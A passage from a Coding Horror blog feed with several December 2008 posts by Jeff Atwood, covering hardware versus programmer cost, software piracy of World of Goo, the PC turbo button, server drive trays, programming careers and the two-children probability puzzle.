<p>Despite the enduring wonder of the yearly parade of newer, better hardware, we'd also do well to remember my all time favorite graph from <a href="http://www.amazon.com/exec/obidos/ASIN/0201657880/codihorr-20">Programming Pearls</a>:</p>
<p><a href="http://www.amazon.com/exec/obidos/ASIN/0201657880/codihorr-20"><img alt="image placeholder" >
<p><a href="http://blog.codinghorror.com/everything-is-fast-for-small-n/">Everything is fast for small n</a>. When n gets large, that's when things start to go sideways. The above graph of an ancient <a href="http://en.wikipedia.org/wiki/TRS-80">Trash-80</a> clobbering a semi-modern <a href="http://en.wikipedia.org/wiki/DEC_Alpha">DEC Alpha</a> is a sobering reminder that <b>the fastest hardware in the world can't save you from bad code</b>. More specifically, poorly chosen data structures or algorithms.</p>
<p>It won't <i>hurt</i> to run badly written code on the fastest possible boxes you can throw at it, of course. But if you want tangible performance improvements, you'll often have to buckle down and optimize the code, too. Patrick Smacchia's <a href="http://codebetter.com/blogs/patricksmacchia/archive/2008/12/01/lessons-learned-from-a-real-world-focus-on-performance.aspx">lessons learned from a real-world focus on performance</a> is a great case study in optimization.</p>
<img alt="image placeholder" >
<p>Patrick was able to improve <a href="http://www.ndepend.com/">nDepend</a> analysis performance fourfold, and cut memory consumption in half. As predicted, most of this improvement was algorithmic in nature, but at least half of the overall improvement came from a variety of different optimization techniques. Patrick likens this to his early days <a href="http://codebetter.com/blogs/patricksmacchia/archive/2008/12/01/lessons-learned-from-a-real-world-focus-on-performance.aspx">writing demo scene code on the Commodore Amiga</a>:</p>
<blockquote>
<p>In the early 90s, I participated in the Amiga demo scene. It's a great illustration of the idea that <b>there is always room for better performance</b>. Every demo ran on the same hardware. It was the perfect incentive for demo developers to produce more and more optimized code. For several years, every month some record was beaten: the number of 3D polygons, the number of sprites, or the number of dots displayed simultaneously at the rate of 50 frames per second. Over a period of a few years, the performance factor obtained was around 50x! Imagine what it means to perform a computation in one second that originally took an entire minute. This massive gain was the result of both better algorithms (with many pre-computations and delegations to sub-chips) and micro-optimizations at assembly language level (better use of the chip registers, better use of the set of instructions).</p>
</blockquote>
<p>Patrick achieved outstanding results, but let's be clear: <b>optimizing your code is hard</b>. And sometimes, dangerous. It is not something you undertake lightly, and you'd certainly want your most skilled programmers working on it. To put it in perspective, let's dredge up a few classic quotes.</p>
<blockquote>
<p><i>Rules of Optimization:<br><br>
Rule 1: Don't do it.<br><br>
Rule 2 (for experts only): Don't do it yet.<br></i><br>
–  <a href="http://en.wikipedia.org/wiki/Michael_A._Jackson">M.A. Jackson</a></p>
<p><i>More computing sins are committed in the name of efficiency (without necessarily achieving it) than for any other single reason - including blind stupidity.</i><br><br>
–  <a href="http://en.wikipedia.org/wiki/William_Wulf">W.A. Wulf</a></p>
</blockquote>
<p>Programmers have a tendency to get lost in the details of <b>optimizing for the sake of optimization</b>, as I've noted before in <a href="http://blog.codinghorror.com/why-arent-my-optimizations-optimizing/">Why Aren't My Optimizations Optimizing?</a> and <a href="http://blog.codinghorror.com/micro-optimization-and-meatballs/">Micro-Optimization and Meatballs</a>. If you're not extremely careful, you could end up spending a <i>lot</i> of very expensive development time with very little to show for it. Or, worse, you'll find yourself facing a slew of new, even more subtle bugs in your codebase.</p>
<p>That's why I recommend the following approach:</p>
<ol>
<li>Throw cheap, faster hardware at the performance problem.</li>
<li>If the application now meets your performance goals, stop.</li>
<li>Benchmark your code to identify specifically where the performance problems are.</li>
<li>Analyze and optimize the areas that you identified in the previous step.</li>
<li>If the application now meets your performance goals, stop.</li>
<li>Go to step 1.</li>
</ol>
<p>Always try to <b>spend your way out of a performance problem first</b> by throwing faster hardware at it. It'll often be a quicker and cheaper way to resolve immediate performance issues than attempting to code your way out of it. Longer term, of course, you'll do both. You'll eventually be forced to revisit those deeper algorithmic concerns and design issues with your code that prevent the application from running faster. And the advantage of doing this on new hardware is that you'll look like an even <i>bigger</i> hero when you deliver the double whammy of optimized code running on speedier hardware.</p>
<p>But until the day that Moore's Law completely gives out on us, one thing's for sure: <b>hardware is cheap  –  and programmers are expensive</b>.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-18T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/hardware-is-cheap-programmers-are-expensive/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Gifts for Geeks: 2008 Edition, Sort Of ]]></title>
<link>https://blog.codinghorror.com/gifts-for-geeks-2008-edition-sort-of/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I was going to post another edition of Gifts for Geeks, as I did in <a href="http://www.codinghorror.com/blog/archives/000738.html">2006</a> and <a href="http://www.codinghorror.com/blog/archives/001010.html">2007</a>, but my heart's just not in it this year. I don't know if it's the global economic apocalypse, or what, but I'm having a hard time mustering the required level of enthusiasm for buying more <i>stuff</i>. There are still some great ideas in the <a href="http://www.codinghorror.com/blog/archives/001010.html">previous year's lists</a>, and honestly it's always fun to window shop if nothing else. But I think this year I'm going for something more modest, more befitting of the barren <a href="http://www.imdb.com/title/tt0082694/">Road Warrior</a> hellscape that's apparently bearing down on all of us.
</p>
<p>
I was something of a <a href="http://www.codinghorror.com/blog/archives/000747.html">skeptic</a> on the road to high definition video, but I can point to <b>one series that has completely defined the high definition experience for me</b>, so much so that I think every human being on Earth should see it at least once: the <a href="http://www.amazon.com/dp/B000MRAAJM/?tag=codihorr-20">Planet Earth BBC Series</a>.
</p>
<p>
<a href="http://www.amazon.com/dp/B000MRAAJM/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
Filmed over five years, at a budget of 25 million dollars, and completely in high definition, the series is nothing less than revelatory. I'm in awe of the footage they captured, imagining how many months they must have spent to filming get a single <i>moment</i> of an <a href="http://en.wikipedia.org/wiki/Amur_Leopard">Amur Leopard</a> stalking across the siberian taiga, one of the last 30 in the world. And the series is <i>full</i> of moments like that. It's not just a showcase for amazing high definition video, but a riveting view into the life of our planet, too.
</p>
<p>
As far as I'm concerned, Planet Earth is the definitive high definition experience to date. Needless to say, highly recommended. I actually picked up the now-obsolete <a href="http://www.amazon.com/dp/B000MRAAJW/?tag=codihorr-20">HD-DVD version</a> of this series (they're encoded identically in VC-1, AC3), and then <a href="http://www.codinghorror.com/blog/archives/001197.html">ripped it for convenience</a> to my <a href="http://www.codinghorror.com/blog/archives/001107.html">home theater PC</a>, so I don't have to juggle four discs. There is a <a href="http://www.amazon.com/dp/B000MR9D5E/?tag=codihorr-20">DVD version</a> as well, but this is a series that demands to be seen in its full high definition glory.
</p>
<p>
For something a little less highbrow and more geeky, you can't go wrong with <a href="http://www.amazon.com/dp/B000HKMQ64/?tag=codihorr-20">Absolutely Mad</a>, a collection of <b>fifty years of Mad magazine, every issue since 1952, on one DVD</b>.
</p>
<p>
<a href="http://www.amazon.com/dp/B000HKMQ64/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
Do you know what famous computer scientist got his start in Mad magazine? No less than <a href="http://www.codinghorror.com/blog/archives/001034.html">Donald Knuth himself</a>, who wrote about the <a href="http://en.wikipedia.org/wiki/Potrzebie">Potrzebie</a> System of Weights and Measures in issue #33. Someone at Google is apparently a fan as well, as Google Calculator offers <a href="http://fubar.school.nz/techblog.php?action=show&amp;id=25">Potrzebie System conversions</a>:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
See? I told you. Geeky. And <i>awesome</i>.
</p>
<p>
I should also mention that the <a href="http://www.amazon.com/dp/B000HKMQ64/?tag=codihorr-20">Absolutely Mad DVD</a> is delightfully free of DRM or crazy custom viewing software. Each issue is a <b>simple, unencumbered PDF file in a folder on the disc</b>. The scans aren't nearly high resolution enough to be a reasonable substitute for the actual issues, or any of the recent full color reproductions. This is probably intentional. But it's more than adequate for browsing on a LCD screen, or, say, a mobile phone or <a href="http://www.codinghorror.com/blog/archives/001179.html">netbook</a>. Still, with 50 years of Mad for thirty measly bucks, it's hard to go wrong. But I am slightly biased -- I still subscribe to Mad. Who knew it took this much <i>work</i> to be stupid?
</p>
<p>
Hopefully by next year at this time, all this looming economic uncertainty will be behind us, and we'll be free to consume guilt-free once again. And if not, well, at least you can use these two shiny discs to blind your enemies.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-21T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/gifts-for-geeks-2008-edition-sort-of/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Pressing the Software Turbo Button ]]></title>
<link>https://blog.codinghorror.com/pressing-the-software-turbo-button/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Does anyone remember <a href="http://www.pcguide.com/ref/case/switchTurbo-c.html">the Turbo Button</a> from older IBM PC models?
</p>
<p>
</p>
<blockquote>
A leftover from machines of five to ten years ago, the turbo switch still remains on many cases, even though it serves no purpose.
<p>
In the early days of the PC, there was only IBM, and there were only a handful of different speeds a PC could run at. Early software was written by programmers who believed they were writing it to run on a machine of a specific speed. When newer, faster machines would come out, some of this software (especially games) would stop working properly because it would run too fast. Turning off the "turbo" function of the PC (which meant anything that made it run faster than an IBM of a particular era) would make the machine run slower so this software would work. In essence, it was a "compatibility mode" feature, to slow down the machine for older software.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Now there are dozens of different combinations of processor types and speeds. Software cannot rely on knowing the speed of the machine, so most programs use speed-detection algorithms. The turbo button no longer serves any useful purpose. On many motherboards there either isn't anywhere to connect it, or there is a place but the motherboard does nothing when you press the button. The best use for this button is to never touch it, or use it for some other purpose. Some older machines will still slow down when the button is pressed, and if you press it by accident your machine will lose performance. It can be surprisingly hard to track down the problem; the front of the machine is the last place anyone appears to notice anything.
</p>
</blockquote>
<p>
I, too, remember the Turbo Button, although by the time I got heavily into PCs in the early 1990's it was already well in decline. <b>The strange thing about a turbo button is that you'd pretty much <i>always want it on</i></b>; there's almost no situation where you'd want to keep some power in reserve for that extra "oomph" required by, say, a particularly intensive Lotus 1-2-3 spreadsheet. You wanted your PC to run at full tilt, maximum possible speed, all the time.
</p>
<p>
I think this hardware philosophy is also true of software, and it applies at both ends of software development:
</p>
<p>
</p>
<ul>
<li>Developers need <a href="http://www.codinghorror.com/blog/archives/000666.html">fast machines to be productive</a>.
</li>
<li>Agile software development practices work best when you <a href="http://www.codinghorror.com/blog/archives/000788.html">iterate rapidly</a>.
</li>
<li>Users <a href="http://www.codinghorror.com/blog/archives/000722.html">prefer software that's responsive</a>.
</li>
</ul>
<p>
Whether you're a coder or a user, performance is a <i>hugely</i> important feature, <a href="http://thecodist.com/article/turbo_productivity_in_programming_is_the_only_thing%0A">as the codist notes</a>:
</p>
<p>
</p>
<blockquote>
In my first job at a defense contractor, I met a couple guys (I thought they were old but they were probably my age now!) who had been writing code since the late 50's and then writing batch applications on an IBM mainframe. Since they could only compile/run once per day (and get the printouts the next day) they would work on 6-8 projects at the same time and weren't concerned when these projects might take years to complete. After two weeks on this I was ready to go insane and got switched to working on a supermini which at least had a realtime operating system. I could write code, compile it and run it at the same time. The only drawback was we had 7 people sharing one terminal at the start. Suggestions that each programmer get a terminal were laughed at initially. Being productive in such a limited time was really hard.
<p>
After a couple years I switched to working on PCs (which were just out) and having my own "computer" was wonderful. Working in Pascal and assembly still wasn't fast yet but at least I had my own space.
</p>
<p>
Then I got Turbo Pascal and life was forever changed. I could write, compile and debug applications virtually instantly and my need for speed has never looked back. Even on the compared-to-today crappy hardware I never really found another environment as fast until I started using PHP this year (which of course has no compilation).
</p>
<p>
Later when I started Mac coding in C we started off with a dreadful C compiler/linker that took 20 minutes to do its thing. When Think-C came out it was almost a Turbo moment again. Eventually it began to get slower and slower and we swtich to Metrowerks Codewarrior which was fast but the applications were getting so big that it still took 30-60 seconds to build sometimes.
</p>
<p>
When I moved to Java in 1998 compiling and linking still took a fairly long time until the IDEs (and the JVM) began to catch up to the hardware. <b>Still nothing was ever as instant as Turbo had been, despite the hardware being 100x faster.</b>
</p>
</blockquote>
<p>
I'm a speed freak too. As far as I'm concerned, everything on a PC should happen instantaneously. Or at least as close to instantaneous as the laws of physics will allow. Simply doing everything <i>faster</i>, all other things being equal, will allow you to get more done. I'm not alone in this; Fred Brooks made a similar observation <a href="http://www.codinghorror.com/blog/archives/000026.html">way back in The Mythical Man-Month</a>:
</p>
<p>
</p>
<blockquote>
There is not yet much evidence available on the true fruitfulness of such apparently powerful tools. There is a widespread recognition that debugging is the hard and slow part of system programming, and slow turnaround is the bane of debugging. So the logic of interactive programming seems inexorable.
<p>
Further, we hear good testimonies from many who have built little systems or parts of systems in this way. The only numbers I have seen for effects on programming of large systems were reported by John Harr of Bell Labs. [..] <b>Harr's data suggest that an interactive facility at least doubles productivity in system programming.</b>
</p>
</blockquote>
<p>
Never underestimate the power of <b>pressing the software turbo button</b>. What's keeping you from going as fast as you can? As a user? As a software developer?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-23T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/pressing-the-software-turbo-button/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Best (or Worst) Geek Christmas Ever ]]></title>
<link>https://blog.codinghorror.com/best-or-worst-geek-christmas-ever/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I was thrilled to discover that Santa Claus left a little unexpected present on my doorstep on Christmas Eve: <a href="http://blog.stackoverflow.com/category/server/">the two Lenovo ThinkServers that I ordered for stackoverflow.com</a>! They weren't supposed to arrive until sometime next week.</p>
<p>I immediately began unboxing the servers with all the eagerness of a kid unwrapping his Christmas presents. The servers are barebones, with basic levels of CPU and memory; I bought some hard drives and extra memory to have on hand for testing and installation. <strong>Configuring servers on Christmas Eve = the best geek christmas, <em>ever!</em></strong></p>
<p><img alt="image placeholder" >
<p>Oooh. Just take a gander at all that hot, sweet server hardware.</p>
<p>After carefully unpacking everything and taking an inventory, my heart sank.</p>
<p><strong>These Lenovo ThinkServers don't include any drive mounting brackets.</strong> Which means I can't install the hard drives. What's worse, <a href="http://forums.lenovo.com/lnv/board/message?board.id=Tower_Server&amp;message.id=35">there's no way to buy the drive brackets alone</a>; you must purchase Lenovo's "server" hard drives if you want the mounting tray / bracket assembly. And Lenovo's drives start at $100 for a generic 160 GB SATA hard drive. That's a heck of a premium to pay for a drive tray. And I'd need <em>eight</em> of them. For comparison, I paid $80 each for a set of 500 GB SATA server class hard drives.</p>
<p>I had naively assumed that these servers would come with the necessary drive trays, just like they have slots for memory and CPU.  Or at the very least the drive trays would be items I could purchase individually. In the case of the smaller 1U server, I can prop the bare SATA drives into position by placing a thin book under them, which is OK for test purposes, but hardly a long term solution for a server I need to ship to a data center.</p>
<p>It's amazing how quickly I went from <strong>best geek Christmas ever to <em>worst</em> geek Christmas ever</strong>. All for want of a few lousy, stinkin' hard drive trays! It's engendering some serious <a href="http://www.codinghorror.com/blog/images/nerd-rage.gif">Nerd Rage</a>.</p>
<p>I guess I'll be either returning these Lenovo ThinkServers, or selling them on Craigslist. How sad to see perfectly good hardware go to waste.</p>
<p><span style="color: red;">Update</span> 1/11/09:</p>
<p>I bought two official $100 drive rails from Lenovo. Pity that they come with worthless 160 GB hard drives attached. Oh, and as an extra bonus "up yours" to customers, they use Torx screws.</p>
<p><img alt="image placeholder" >
<p>Thanks to some eagle-eyed Coding Horror commenters (seriously, you guys rock), I also found an eBay seller with slightly older IBM SATA removable drive rails for sale at $25 each:</p>
<p><img alt="image placeholder" >
<p>The older IBM drive rails work perfectly in the newer Lenovo servers, although the front design is ever so slightly cosmetically different. The model # is <strong>IBM 42R4131</strong>, and they're for the older IBM xSeries 3250, x306m, x3550, x3650, 3800, 3850 servers. So the good news is I only have to buy $250 worth of drive rails, instead of $1000 worth. Or at least that's what I'm telling myself..</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-24T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/best-or-worst-geek-christmas-ever/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ My Software Is Being Pirated ]]></title>
<link>https://blog.codinghorror.com/my-software-is-being-pirated/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
If you're at all familiar with computer history, you might have heard of Bill Gates' famous 1976 <a href="http://www.digibarn.com/collections/newsletters/homebrew/V2_01/gatesletter.html">letter to the Homebrew Computer Club</a>. The letter was written to address rampant piracy of Bill's earliest product, <a href="http://en.wikipedia.org/wiki/Altair_BASIC">Altair BASIC</a>, which was being passed around quite freely by hobbyists in paper tape form, without any sort of payment to Microsoft (or, as it was <a href="http://www.codinghorror.com/blog/archives/000363.html">then called</a>, Micro-Soft).
</p>
<p>
Bill was understandably upset about this state of affairs.
</p>
<p>
<a href="http://www.codinghorror.com/blog/images/bill-gates-open-letter-to-hobbyists.png"><img alt="image placeholder" >
</p>
<p>
It's an interesting figure: less than 10% of the "users" had actually purchased a copy; the other 90% had pirated it. Let's compare that statistic with a <a href="http://www.rockpapershotgun.com/2008/11/12/world-of-good-news-euro-release-imminent/">blog comment left November 12th</a> by one of the authors of the critically acclaimed indie game <a href="http://www.worldofgoo.com/">World of Goo</a>:
</p>
<p>
</p>
<blockquote>
last we checked <b>the piracy rate was about 90%.</b>
</blockquote>
<p>
32 years later, and we've ended up back exactly where we started. That's not exactly a resounding affirmation of the human spirit, or anything.
</p>
<p>
That 90% piracy figure was later <a href="http://2dboy.com/2008/11/13/90/">substantiated in a blog post</a>:
</p>
<p>
</p>
<blockquote>
First, and most importantly, how we came up with this number:  the game allows players to have their high scores reported to our server (it's an optional checkbox). We record each score and the IP from which it came. We divided the total number of sales we had from all sources by the total number of unique IPs in our database, and came up with about 0.1. That's how we came up with 90%.
<p>
It's just an estimate though... there are factors that we couldn't account for that would make the actual piracy rate lower than our estimate:
</p>
<p>
</p>
<ul>
<li>some people install the game on more than one machine
</li>
<li>most people have dynamic IP addresses that change from time to time
</li>
</ul>
<p>
There are also factors that would make the actual piracy rate higher than our estimate:
</p>
<p>
</p>
<ul>
<li>more than one installation behind the same router/firewall (would be common in an office environment)
</li>
<li>not everyone opts to have their scores submitted
</li>
</ul>
<p>
For simplicity's sake, we just assumed those would balance out.  So take the 90% as a rough estimate.
</p>
</blockquote>
<p>
What makes this particularly depressing is that that <b>World of Goo is not a game that <i>deserves</i> to be pirated</b>. Not just because it's easily one of the best games of 2008 (and it really is -- please try the demo for <a href="http://worldofgoo.com/dl2.php?lk=demo&amp;filename=WorldOfGooDemo.1.0.exe">Windows</a> or <a href="http://worldofgoo.com/dl2.php?lk=demo&amp;filename=WorldOfGooDemo.1.20.dmg">Mac</a>).
</p>
<p>
<a href="http://worldofgoo.com/dl2.php?lk=demo"><img alt="image placeholder" >
</p>
<p>
The crushing piracy rate is especially painful in this case because World of Goo was handcrafted by a <b>tiny 2 man independent programming shop</b>. Even a cursory 10 minute session is more than enough to demonstrate that this is a game built with <i>love</i>, not another commercial product extruded from the bowels of some faceless Activision-EA corporate game franchise sweatshop. Nor is this an exorbitantly priced bit of Adobe software that costs hundreds or thousands of dollars; it's a <a href="http://www.amazon.com/dp/B001ENOVP2/?tag=codihorr-20">measly twenty bucks</a>! Fifteen, if you count the fact that it's <a href="http://store.steampowered.com/holidaysale/">on sale right now via Steam</a>. Oh, and did I mention that the developers explicitly <a href="http://2dboy.com/category/drm/">chose to avoid any form of onerous copy protection?</a>
</p>
<p>
Doesn't matter. 90% piracy rate. Just like Altair BASIC. And <a href="http://www.gamasutra.com/php-bin/news_index.php?story=17350">every other game</a>.
</p>
<p>
Now, I'm no saint. I essentially grew up as a hardcore Apple // scene pirate, resolutely avoiding those public service announcements not to <a href="http://www.youtube.com/watch?v=-Xfqkdh5Js4">copy that floppy</a>. I have a deep and personal understanding of the fact that <b>not every person who pirates the software would ultimately buy it anyway.</b>  I was just a kid; I barely had money enough to <a href="http://www.codinghorror.com/blog/archives/001051.html">have a computer at all</a>. This is why the <a href="http://arstechnica.com/news.ars/post/20050614-4993.html">BSA's hypothetical piracy loss claims</a> are more fantasy than anything else. Piracy is a natural state of affairs for users with lots of time and no money.
</p>
<p>
But it doesn't stay that way. Now that I'm older, I have money -- and a taste for software. I buy software all the time. I urge other people to buy software all the time. I've worked for companies that buy hundreds of thousands of dollars worth of software. I've even gone so far as proposing a <a href="http://www.codinghorror.com/blog/archives/000735.html">Support Your Favorite Small Software Vendor Day</a>, and I still try to live up to that goal. I have a budget set aside to buy some bit of software from a small development shop, each and every month. As programmers, we of all people should appreciate the message Bill Gates outlined in <a href="http://www.digibarn.com/collections/newsletters/homebrew/V2_01/gatesletter.html">his original 1976 letter</a> better than anyone else: <b>buying software supports programmers</b>.
</p>
<p>
But let me be absolutely crystal clear about one thing: as a programmer, <b>if you write software and charge money for it, your software <i>will</i> be pirated</b>. Guaranteed. Consider this <a href="http://discuss.joelonsoftware.com/default.asp?joel.3.716622.16">recent example from the Joel on Software forums</a>:
</p>
<p>
</p>
<blockquote>
My software is being pirated.
<p>
I have contacted with the forum where is the post with the crack and with the business that he requested (I called him) this crack. But they do not seem to want to collaborate. What I do?
</p>
<p>
How I can prevent future actions like this?
</p>
<p>
Now, the users can download a demo limited by days from my website and others' websites. I'm using Quick License Manager....
</p>
</blockquote>
<p>
Short of ..
</p>
<p>
</p>
<ol>
<li>selling custom hardware that is required to run your software, like the Playstation 3 or Wii
</li>
<li>writing a completely server-side application like World of Warcraft or Mint
</li>
</ol>
<p>
.. you have no recourse. Software piracy is a fact of life, and there's very little you can do about it. The more DRM and anti-piracy devices you pile on, the more likely you are to harm and alienate your paying customers. Use a common third party protection system and it'll probably be cracked along with all the other customers of that system. Nobody wants to leave the front door to their house open, of course, but you should err on the side of simple protection whenever possible. Bear in mind that a certain percentage of the audience simply can't be reached; they'll <a href="http://www.codinghorror.com/blog/archives/000489.html">never pay for your software at any price</a>. Don't penalize the honest people to punish the incorrigible. As my friend Nathan Bowers <a href="http://twitter.com/NathanBowers/statuses/1065621748">so aptly noted</a>:
</p>
<p>
</p>
<blockquote>
Every time DRM prevents legitimate playback, a pirate gets his wings.
</blockquote>
<p>
In fact, the most effective anti-piracy software development strategy is the simplest one of all:
</p>
<ol>
<li>
<b>Have a great freaking product.</b>
</li>
<li>
<b>Charge a fair price for it.</b>
</li>
</ol>
<p>
(Or, more radically, choose an open source business model where piracy is no longer a problem but a benefit -- the world's most efficient and viral software distribution network. But that's a topic for a very different blog post.)
</p>
<p>
Now, it's up to you to prove me right and revive my waning belief in the essential goodness of the human spirit by <b>buying a copy of World of Goo</b>, ideally <a href="http://2dboy.com/games.php">directly from the developers</a>.
</p>
<p>
Or you could, y'know, pirate it like everyone else.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-27T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/my-software-is-being-pirated/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Programming: Love It or Leave It ]]></title>
<link>https://blog.codinghorror.com/programming-love-it-or-leave-it/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In a recent Joel on Software forum post <a href="http://discuss.joelonsoftware.com/default.asp?joel.3.718003.14">Thinking of Leaving the Industry</a>, one programmer wonders if software development is the right career choice in the face of broad economic uncertainty:
</p>
<p>
</p>
<blockquote>
After reading the disgruntled posts here from long time programmers and hearing so much about ageism and outsourcing, I'm thinking of leaving the industry.  What is a good industry to get into where your programming skills would put you at an advantage?
</blockquote>
<p>
Joel Spolsky responded:
</p>
<p>
</p>
<blockquote>
Although the tech industry is not immune, programming jobs are not really being impacted. Yes, there are fewer openings, but there are still openings (see my job board for evidence). I still haven't met a great programmer who doesn't have a job. I still can't fill all the openings at my company.
<p>
Our pay is great. There's no other career except Wall Street that regularly pays kids $75,000 right out of school, and where so many people make six figures salaries for long careers with just a bachelors degree. There's no other career where you come to work every day and get to invent, design, and engineer the way the future will work.
</p>
<p>
Despite the occasional idiot bosses and workplaces that forbid you from putting up Dilbert cartoons on your cubicle walls, there's no other industry where workers are treated so well. Jesus you're spoiled, people. Do you know how many people in America go to jobs where you need permission to go to the bathroom?
</p>
<p>
<b>Stop the whining, already. Programming is a fantastic career.</b> Most programmers would love to do it even if they didn't get paid. How many people get to do what they love and get paid for it? 2%? 5%?
</p>
</blockquote>
<p>
I tend to agree with Joel's brand of tough love. What he seems to be saying -- after taking my usual poetic license -- is this:
</p>
<p>
<b>Programming: love it or leave it.</b>
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Unless you're fortunate enough to work for a top tier software development company, like Google, Microsoft, or Apple, you've probably experienced first hand the <a href="http://www.codinghorror.com/blog/archives/000072.html">huge skill disparities in your fellow programmers</a>. I'm betting you've also wondered more than once <a href="http://www.codinghorror.com/blog/archives/000781.html">why some of your coworkers can't, well, <i>program</i></a>. Even if that's what their job description says.
</p>
<p>
Over the last twenty years, I've worked with far too many programmers who honestly <b>had no business being paid to be a programmer</b>. Now, I'm not talking about your average programmer here. We're all human, and we all make mistakes. I'm talking about <a href="http://www.codinghorror.com/blog/archives/000824.html">the Daily WTF crew</a>. People that actively give programming a bad name, and you, as their coworker, a constant headache.
</p>
<p>
Like Joel, I'm not ready to call the current conditions <a href="http://www.codinghorror.com/blog/archives/000843.html">a new dot com bubble</a> yet, because business is still quite good. But one of the (very) few bright spots of the previous bubble was that <b>it weeded out all the people who didn't truly love software development</b>. Once the incentive to become an overnight dot-com genius programmer millionaire was gone, computer science enrollment suddenly dropped precipitously at colleges across the country. The only people left applying for programming jobs were the true freaks and geeks who, y'know, <a href="http://www.codinghorror.com/blog/archives/000761.html"><i>loved</i> this stuff</a>. The kind of people I had originally enjoyed working with so much. At least until a bunch of careerist gold diggers suddenly showed up and started polluting our workplace.
</p>
<p>
As much as the dot com bubble sucked, I was <i>intensely</i> glad to see these people go. Now I'm wondering if the current economic conditions are an opportunity to clean house again.
</p>
<p>
<b>I mean this in the nicest possible way, but not everyone <i>should</i> be a programmer.</b> How often have you wished that a certain coworker of yours would suddenly have an epiphany one day and decide that this whole <i>software engineering</i> thing just isn't working out for them? How do you tell someone that the quality of their work is terrible and <a href="http://www.codinghorror.com/blog/archives/000543.html">they'll never be good at their job</a> -- so much so that they should literally <i>quit</i> and pursue a new career? I've wanted to many times, but I never had the guts.
</p>
<p>
Joel implied that good programmers love programming so much they'd do it for <i>no pay at all</i>. I won't go quite that far, but I will note that the best programmers I've known have all had a <b>lifelong passion for what they do</b>. There's no way a minor economic blip would ever convince them they should do anything else. No way. No how.
</p>
<p>
So if a programmer <i>ever</i> hints, even in passing, that they might possibly want to exit the field -- they probably should. I'm not saying you should be a jerk about it, obviously. But if someone has any doubt at all about programming as a career choice, they should be encouraged to explore alternatives -- and make room for another programmer who <a href="http://www.codinghorror.com/blog/archives/000212.html">unashamedly loves to code</a>.
</p>
<p>
Then again, maybe I'm not the best person to ask. I spent Christmas Eve <a href="http://www.codinghorror.com/blog/archives/001200.html">setting up servers</a>. I'm on holiday right now, sitting in a hotel room in Santa Barbara, and you know what I spent the last two nights doing until the wee hours of the morning? Writing code to improve <a href="http://stackoverflow.com/">Stack Overflow</a>. Oh yeah, and this blog post.
</p>
<p>
So I might be a <i>little</i> biased.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-29T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/programming-love-it-or-leave-it/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Problem of the Unfinished Game ]]></title>
<link>https://blog.codinghorror.com/the-problem-of-the-unfinished-game/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Today's post is a simple question.
</p>
<p>
Let's say, hypothetically speaking, you met someone who told you they had two children, and one of them is a girl. <b>What are the odds that person has a boy <i>and</i> a girl?</b>
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Consider your answer carefully, <i>without</i> doing a web search, or reading the comments to this post. Don't cheat -- but be prepared to explain your reasoning, because the solution might surprise you.
</p>
<p>
It's almost like some kind of <a href="http://www.codinghorror.com/blog/archives/000850.html">conspiracy</a> or something.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-30T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-problem-of-the-unfinished-game/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Finishing The Game ]]></title>
<link>https://blog.codinghorror.com/finishing-the-game/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In <a href="http://www.codinghorror.com/blog/archives/001203.html">yesterday's post</a>, I asked this question:
</p>
<p>
</p>
<blockquote>
Let's say, hypothetically speaking, you met someone who told you they had two children, and one of them is a girl. <b>What are the odds that person has a boy and a girl?</b>
</blockquote>
<p>
Most people answer 50%.
</p>
<p>
Unfortunately, this isn't correct.
</p>
<p>
This problem, although seemingly simple, is hard to understand. For cognitive reasons that are not fully understood, while our intuitions regarding <i>a priori</i> possibilities are fairly good, we are easily misled when we try to use probability to quantify our knowledge. This is a fancypants way of saying there were almost a <i>thousand</i> comments on that post, with not a lot of agreement to be found.
</p>
<p>
The key thing to bear in mind here is that <b>we have been given additional information</b>. If we <i>don't</i> use that information, we arrive at 50% -- the odds of a girl or boy being born to any given pregnant woman. That's true insofar as it goes, but it's the answer to a different, much simpler question, and certainly not the answer to the question we asked.
</p>
<p>
Our question contains additional information:
</p>
<p>
</p>
<ol>
<li>The person has two children.
</li>
<li>One of those children is a girl.
</li>
</ol>
<p>
